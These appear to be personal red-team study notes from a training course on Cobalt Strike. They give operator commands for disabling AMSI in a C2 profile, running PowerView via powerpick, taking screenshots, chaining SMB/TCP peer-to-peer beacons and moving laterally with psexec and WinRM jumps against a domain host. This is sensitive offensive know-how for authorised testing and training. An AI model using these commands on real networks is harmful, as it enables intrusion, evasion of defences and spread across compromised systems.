### Cobalt Strike Usage

These notes have been primarily gathered from my small amount of time using Cobalt Strike in [Rastamouse's CRTO](https://training.zeropointsecurity.co.uk/courses/red-team-ops) course and all credit is due there.

### Using PowerShell/.NET Binaries
```powershell
# Remember to add the AMSI disable directive in your C2 profile
post-ex {
    set amsi_disable "true";
}

# Import powerview (The path is local)
powershell-import c:\Tools\PowerSploit\Recon\PowerView.ps1

# Use powerpick (Will use powershell and run it via .NET rather than by powershell.exe
powerpick Get-NetUser Toby
```

### Host Enumeration

```bash
# Screenshots! They are stored in Views -> Screenshots
printscreen (single screenshot using printscreen)
screenshot (single screenshot)
screenwatch (periodic screenshots)
```

### Peer to Peer Beacons

It's useful to only have egress traffic going out of your initial beacon. Peer to peer beacons allow compromised hosts to communicate over SMB/TCP and forward on the traffic back to the host you've initially got a beacon on, ensuring only one machine is calling out to your teamserver.

Listeners -> Add -> Beacon (SMB/TCP)
Generate payload for listener -> Attacks -> Packages -> Windows Stageless EXE

Run the exe (TCP Beacon this is). This binds to port 4444 (or whatever port) on your machine.

From the beacon you then connect back to it. 
```powershell
link (smb)
connect (tcp)

connect <listening inferface>:<port>
```

The TCP P2P machine has no access to the team server, it simply receives requests forwarded from the client it is attached to. The teamserver sends it to the joining machine, which forwards it to the listening tcp bind port. 


### Lateral Movement

We can move laterally over SMB, WMI, or WinRM. You can specify to jump or run remote commands. To start a listener, just add an SMB beacon. 

Listeners -> Add -> Beacon (SMB/TCP)

Bonus point: It's recommended to move laterally using SMB where possible due to its abundance in Windows environments!

```powershell
# Jump using SMB to a target. Requires writeable ADMIN$ share.
jump psexec64 dc04 smb
jump psexec dc04 smb
```

A few aspects to note:

-   Cobalt Strike will use the same name for the service and the exe filename
-   The service binary path will be a UNC path to `ADMIN$`, rather than `C:\Windows`.
-   psexec and psexec64 will migrate into rundll32.exe and then wipe the service binary from disk.


```powershell
remote-exec winrm dc04 whoami
jump winrm64 dc04 smb
```